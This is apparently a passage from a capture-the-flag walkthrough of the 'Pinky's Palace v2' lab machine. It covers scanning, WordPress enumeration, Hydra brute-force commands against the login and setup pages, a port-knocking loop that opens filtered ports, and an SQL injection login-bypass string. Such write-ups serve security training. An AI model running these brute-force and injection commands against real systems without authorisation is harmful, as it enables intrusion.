# Pinky's Palace: v2

## Identify the target server IP address using Nmap

```
root@kali:~/Desktop# nmap -sP -PA21,22,25,3389 192.168.126.1/24
---SNIP---
MAC Address: 00:50:56:F3:96:7E (VMware)
Nmap scan report for 192.168.126.131
Host is up (0.00022s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds
```

Our target is 192.168.126.131

## Kick things off with Vanquish to automate our enumeration process in the background.
https://github.com/frizb/Vanquish

```
root@kali:~/Documents# cd Vanquish/
root@kali:~/Documents/Vanquish# echo 192.168.126.131 >> pinky.txt
root@kali:~/Documents/Vanquish# python Vanquish2.py -hostFile pinky.txt -verbose -logging
                  )             (   (       )  
         (     ( /(   (         )\ ))\ ) ( /(  
 (   (   )\    )\())( )\     ( (()/(()/( )\()) 
 )\  )((((_)( ((_)\ )((_)    )\ /(_))(_)|(_)\  
((_)((_)\ _ )\ _((_|(_)_  _ ((_|_))(_))  _((_) 
\ \ / /(_)_\(_) \| |/ _ \| | | |_ _/ __|| || | 
 \ V /  / _ \ | .` | (_) | |_| || |\__ \| __ | 
  \_/  /_/ \_\|_|\_|\__\_\\___/|___|___/|_||_| 
Get to shell.
Vanquish Version: 0.29 Updated: March 18, 2018

Configuration file: config.ini
Attack plan file:   attackplan.ini
Output Path:        ./pinky
Host File:          pinky.txt
---SNIP---
```

With Vanquish running in the background, I begin to review the website content manually while collecting the HTTP requests and responses through BurpSuite.

## Host file shenanigans
The website looks quite broken at first and I notice that it references a host named pinkydb, so I use VI to add that to my /etc/hosts file.

```
root@kali:/etc# cat hosts
127.0.0.1	localhost
127.0.1.1	kali
192.168.126.131 pinkydb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## WPScan
After loading the page with pinkydb loaded into my hosts file I can see we are dealing with a wordpress site.
Vanquish has automaticlly performed a WPScan so I check for any findings in that file.

```
root@kali:~/Documents/Vanquish/pinky/192_168_126_131/http# cat HTTP_Wordpress_Scan_1_80.txt 
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.126.131/
[+] Started: Wed Mar  7 13:27:06 2018

[!] The WordPress 'http://192.168.126.131/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://pinkydb/index.php?rest_route=/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.25 (Debian)
[+] XML-RPC Interface available under: http://192.168.126.131/xmlrpc.php
[!] Includes directory has directory listing enabled: http://192.168.126.131/wp-includes/
---SNIP---
[+] WordPress version 4.9.4 

[+] WordPress theme in use: twentyseventeen - v1.4
---SNIP---
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+

---SNIP---
```

Looks like we have a username: pinky1337
WordPress is running a very recent version and does not appear to be running any vulnerable plugins according to WPScan.

## Nmap TCP Scan All Ports Results
Time to take a quick look at the other ports open on this server, Vanquish has now finished it's scanning so I will check the NMAP scan results.

```
root@kali:~/Documents/Vanquish/pinky/192_168_126_131/always# cat Nmap_All_TCP_0.txt

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 13:27 PST
Nmap scan report for 192.168.126.131
Host is up (0.00030s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:11:5C:81 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds
```

From the Nmap results we are able to see 3 ports that have been filtered by a firewall:
4655, 7654, 31337

## Gobuster and Nikto 

Vanquish ran gobuster using the Dirb Common.txt and Dirb Big.txt directory lists.

*Nikto:*
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ OSVDB-3092: /secret/: This might be interesting...
```

*Gobuster:*
```
Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.126.131:80/
[+] Threads      : 5
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 200,204,500
[+] Auth User    : username
[+] Follow Redir : true
[+] Expanded     : true
=====================================================
http://192.168.126.131:80/secret (Status: 200)
http://192.168.126.131:80/wordpress (Status: 200)
http://192.168.126.131:80/wp-content (Status: 200)
http://192.168.126.131:80/wp-includes (Status: 200)
http://192.168.126.131:80/wp-admin (Status: 200)
=====================================================
```

Looks like we have a wordpress admin access area and what appears to be an entirely separate wordpress instance that has not yet been fully configured in the /wordpress path.
The wordpress path is allowing me to setup a new instance of a wordpress site, but only if I am able to provide Database Credentials.

## Tell me a secret

The most interesting finding was the secret folder path that allowed the viewing of a file called bambam.txt.
http://192.168.126.131/secret/bambam.txt
```
8890
7000
666

pinkydb
```

With the wordpress username and secret content in hand, I converted the numbers into thier Ascii character equivalents and added them to the password list already created by vanquish (using CEWL and other sources).

I attempted to brute force my way into the Wordpress login page that I found and the wp setup page I had found.

```
hydra -l pinky1337 -P passwordlist.txt 192.168.126.131 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```


```
hydra -L users.txt -P passwordlist.txt 192.168.126.131 -V http-form-post '/wordpress/wp-admin/setup-config.php?step=2:dbname=database&uname=^USER^&pwd=^PASS^&dbhost=localhost&prefix=wp_&language=&submit=Submit:Error establishing a database connection'
```

The brute force apporach failed to yield any results.

## Knock Knock Knock...

After revisting bambam.txt again, I realized that these numbers are likely part of a port knock sequence to allow certian ports that are currently blocked to open up.  "Bam Bam" is of course the sound that someone makes when knocking on a door.

Port Knocking with Nmap
```
for x in 8890 7000 666; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.225.130 && sleep 1; done
```

Check results:
```
root@kali:~# nmap -sS -p80,4655,7654,31337 192.168.225.130
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 17:48 PST
Nmap scan report for 192.168.225.130
Host is up (0.00052s latency).

PORT      STATE    SERVICE
80/tcp    open     http
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:11:5C:81 (VMware)
```

Hmmm still filtered.
I then proceeded to try running the numbers multiple times and in different combinations until this combination finally resulted in open ports:

```
for x in 7000 666 8890; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.225.130 && sleep 1; done
```

```
root@kali:~# nmap -sS -p80,4655,7654,31337 192.168.225.130
Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-07 18:02 PST
Nmap scan report for 192.168.225.130
Host is up (0.00052s latency).

PORT      STATE SERVICE
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
MAC Address: 00:0C:29:11:5C:81 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

## Open Sesame
Nmap was used to perform some port identification on the newly opened ports.

```
root@kali:~# nmap -sS -A -p80,4655,7654,31337 192.168.225.130
---SNIP---
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (EdDSA)
7654/tcp  open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
---SNIP---
```

We now have a webserver (Nginx), an SSH port and what appears to be a console or shell.

Upon further investigation, the new webserver really wants you to use pinkydb rather than the ip address in order to access it. Otherwise, we end up getting a 403: forbidden message.

```
root@kali:/etc# wget http://192.168.225.130:7654
--2018-03-07 18:35:40--  http://192.168.225.130:7654/
Connecting to 192.168.225.130:7654... connected.
HTTP request sent, awaiting response... 403 Forbidden
2018-03-07 18:35:40 ERROR 403: Forbidden.

root@kali:/etc# wget http://pinkydb:7654
--2018-03-07 18:35:51--  http://pinkydb:7654/
Resolving pinkydb (pinkydb)... 192.168.225.130
Connecting to pinkydb (pinkydb)|192.168.225.130|:7654... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                  [ <=>                          ]     134  --.-KB/s    in 0s      

2018-03-07 18:35:51 (20.7 MB/s) - ‘index.html’ saved [134]
```

So I decided to run Vanquish again against the newly opened up server ports using the pinkdb name rather than the ip address in the background while I manually reviewed the new html server content.


```
root@kali:~/Documents/Vanquish# echo pinkydb >> pinkydb.txt
root@kali:~/Documents/Vanquish# python Vanquish2.py -hostFile pinkydb.txt -verbose -logging
 __      __     _   _  ____  _    _ _____  _____ _    _ 
 \ \    / /\   | \ | |/ __ \| |  | |_   _|/ ____| |  | |
  \ \  / /  \  |  \| | |  | | |  | | | | | (___ | |__| |
   \ \/ / /\ \ | . ` | |  | | |  | | | |  \___ \|  __  |
    \  / ____ \| |\  | |__| | |__| |_| |_ ____) | |  | |
     \/_/    \_\_| \_|\___\_\\____/|_____|_____/|_|  |_|
Set your Mertilizers on "deep fat fry".
Vanquish Version: 0.29 Updated: March 18, 2018

Configuration file: config.ini
Attack plan file:   attackplan.ini
Output Path:        ./pinkydb
Host File:          pinkydb.txt
---SNIP---
```

I quickly tried to perform a SQL authentication bypass on the login form with the username `' OR 1=1 --` but this had no effect.
